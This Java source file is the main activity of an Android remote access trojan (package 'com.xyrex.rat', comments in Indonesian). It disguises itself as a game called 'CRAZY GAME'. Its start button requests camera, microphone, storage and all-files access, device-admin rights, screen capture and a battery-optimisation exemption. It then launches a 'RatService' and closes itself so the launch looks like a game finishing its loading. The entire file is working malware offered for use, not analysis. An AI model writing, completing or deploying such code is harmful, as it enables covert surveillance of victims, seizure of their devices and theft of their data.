package com.xyrex.rat;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class MainActivity extends AppCompatActivity {
    @Override protected void onCreate(Bundle b){
        super.onCreate(b);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(80, 150, 80, 80); // Bikin tombol di tengah kayak game
        
        TextView tv = new TextView(this);
        tv.setText("CRAZY GAME\n\nKlik tombol di bawah untuk memulai permainan!");
        tv.setTextSize(20);
        tv.setGravity(android.view.Gravity.CENTER);
        ll.addView(tv);

        Button start = new Button(this);
        start.setText("MULAI MAIN");
        start.setTextSize(18);
        start.setOnClickListener(v -> mulaiSemua());
        ll.addView(start);

        setContentView(ll);
    }

    private void mulaiSemua() {
        // 1. Minta Izin Biasa (Kamera, File, Notif)
        java.util.List<String> p = new java.util.ArrayList<>();
        p.add(Manifest.permission.CAMERA);
        p.add(Manifest.permission.RECORD_AUDIO);
        if (Build.VERSION.SDK_INT >= 33){
            p.add(Manifest.permission.POST_NOTIFICATIONS);
            p.add(Manifest.permission.READ_MEDIA_IMAGES);
            p.add(Manifest.permission.READ_MEDIA_VIDEO);
        } else {
            p.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            p.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
        }
        ActivityCompat.requestPermissions(this, p.toArray(new String[0]), 99);

        // 2. Minta Izin Semua File
        if (Build.VERSION.SDK_INT >= 30){
            try {
                if (!android.os.Environment.isExternalStorageManager()){
                    Intent i = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    i.setData(Uri.parse("package:"+getPackageName()));
                    startActivity(i);
                }
            } catch (Exception e){}
        }

        // 3. Aktifkan Device Admin
        ComponentName cn = new ComponentName(this, AdminReceiver.class);
        Intent adm = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        adm.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn);
        startActivity(adm);

        // 4. Minta Izin Rekam Layar
        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        startActivityForResult(mpm.createScreenCaptureIntent(), 1001);

        // 5. Bypass Baterai
        try {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())){
                Intent i = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                i.setData(Uri.parse("package:"+getPackageName()));
                startActivity(i);
            }
        } catch (Exception e){}

        // 6. Jalankan Service RAT & Sembunyikan Aplikasi
        try {
            Intent svc = new Intent(this, RatService.class);
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc); else startService(svc);
            finishAffinity(); // Tutup aplikasi biar kayak game selesai loading
        } catch (Exception e){}
    }

    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        if (req == 1001 && res == RESULT_OK) {
            ScreenCaptureActivity.RESULT_DATA = data; // Simpan izin rekam layar
        }
    }
}
